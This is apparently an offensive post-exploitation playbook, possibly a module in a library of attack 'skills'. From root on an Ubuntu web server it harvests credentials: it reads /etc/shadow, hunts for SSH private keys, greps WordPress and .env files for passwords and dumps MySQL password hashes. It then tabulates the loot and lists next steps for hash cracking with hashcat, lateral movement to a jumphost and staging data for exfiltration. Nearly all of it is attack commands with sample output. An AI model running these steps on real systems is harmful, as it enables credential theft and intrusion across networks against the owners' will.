# Linux Credential Harvesting

## Scenario
Root access on Ubuntu web server, harvesting credentials for lateral movement.

## Step 1: Shadow File
```bash
root@webserver:~# cat /etc/shadow | grep -v '!' | grep -v '*'
root:$6$rAnD0mSaLt$abc123def456ghi789jklmno/pqrstuvwxyz012345:19500:0:99999:7:::
deploy:$6$aNoThErSaLt$xyz789abc012def345ghi678jklmno/pqrstuvw:19400:0:99999:7:::
admin:$6$yEtAnOtHeR$mno345pqr678stu901vwx234yz567abc890def12:19350:0:99999:7:::
dbbackup:$6$lAsT0nE$ghi123jkl456mno789pqr012stu345vwx678yz9:19300:0:99999:7:::
```

## Step 2: SSH Keys
```bash
root@webserver:~# find /home -name "id_*" -type f 2>/dev/null
/home/deploy/.ssh/id_ed25519
/home/admin/.ssh/id_rsa

root@webserver:~# cat /home/deploy/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBxM... deploy@webserver01
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHvQ... deploy@jumphost
```

## Step 3: Config Files
```bash
root@webserver:~# cat /var/www/html/wp-config.php | grep -i 'db_\|password\|user'
define('DB_NAME', 'wordpress');
define('DB_USER', 'wp_admin');
define('DB_PASSWORD', 'W0rdPr3ss!DB#2024');
define('DB_HOST', 'localhost');

root@webserver:~# cat /opt/app/.env | grep -i pass
DB_PASSWORD=Pr0dApp#2024!
REDIS_PASSWORD=R3d1sCach3!
SMTP_PASSWORD=M@1lS3nd3r2024
```

## Step 4: Database Credentials
```bash
root@webserver:~# mysql -u root -pR00tDB!2024 -e "SELECT user,authentication_string FROM mysql.user;"
+------------------+-------------------------------------------+
| user             | authentication_string                     |
+------------------+-------------------------------------------+
| root             | *6BF1A5B0E1234567890ABCDEF...             |
| wp_admin         | *8CF2B6C1F2345678901BCDEF0...             |
| app_readonly     | *3AD4C7D2E3456789012CDEF01...             |
| backup_user      | *5BE6D8E3F4567890123DEF012...             |
+------------------+-------------------------------------------+
```

## Credentials Summary
| Source | Username | Password | Target |
|--------|----------|----------|--------|
| /etc/shadow | deploy | [hash - crack] | Local/SSH |
| wp-config.php | wp_admin | W0rdPr3ss!DB#2024 | MySQL |
| .env | app | Pr0dApp#2024! | App DB |
| .env | redis | R3d1sCach3! | Redis 172.16.0.25 |
| .bash_history | root | R00tDB!2024 | MySQL root |
| SSH key | deploy | [no passphrase] | jumphost, other servers |

## Next Steps
→ **credential_access skill**: Crack shadow hashes with hashcat -m 1800
→ **lateral_movement skill**: SSH with deploy key to jumphost
→ **exfiltration skill**: Stage and encrypt collected credentials
